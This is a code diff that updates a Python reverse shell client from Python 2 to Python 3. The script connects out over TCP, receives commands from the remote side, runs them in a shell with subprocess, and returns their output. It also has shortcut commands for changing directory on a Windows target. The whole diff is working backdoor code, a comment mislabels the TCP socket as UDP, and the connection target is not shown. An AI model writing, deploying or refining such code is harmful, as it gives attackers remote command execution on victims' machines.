@@ -1,13 +1,7 @@
-#
-# Script VALIDATION : YES
-# python27
-# Update : TODO: moving directory
-
 # 1 - import right module
+import os
 import socket
 import subprocess
-import os
-import sys
 
 # 2 - create UDP/IP socket
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -26,34 +20,31 @@ sock.send(connected)
 # interpret it as command line
 while True:
 
-      rcv_command = sock.recv(3096)
-      op = subprocess.Popen(rcv_command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+    rcv_command = sock.recv(3096).decode("utf-8")
+    op = subprocess.Popen(rcv_command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
 
-      # 7 print rcv_command for test
-      print (rcv_command)
-      print (op.pid)
-      print (op.wait())
+    # 7 print rcv_command for test
+    # Test block
+    print(rcv_command)
+    print(op.pid)
+    print(op.wait())
+    # End Of Test Block
 
-      # Go to C:\
-      if rcv_command == "root":
-            os.chdir("c:/")
-            sock.sendall("Change Directory to C:/")
+    # Go to C:\
+    if rcv_command == "root":
+        os.chdir("c:/")
+        sock.sendall(b"Change Directory to C:/")
 
-      # Change Directory
-      if rcv_command == "chg":
-            os.chdir(os.getcwd() + "/")
-            sock.sendall("[!] actual path:" + os.getcwd())
+    # Change Directory
+    if rcv_command == "chg":
+        os.chdir(os.getcwd() + "/")
+        sock.sendall(b"[!] actual path:" + os.getcwd().encode("utf-8"))
 
-      # if rcv_command ==  "cd"
+    # if rcv_command ==  "cd"
 
-      # Command not recognize
-      if op.wait() == 0:
-            output_cmd = (op.stdout.read())
-            sock.sendall(output_cmd)
-      else:
-            sock.sendall("[!] Error Command")
-
-
-
-
-
+    # Command not recognize
+    if op.wait() == 0:
+        output_cmd = (op.stdout.read())
+        sock.sendall(output_cmd)
+    else:
+        sock.sendall(b"[!] Error Command")
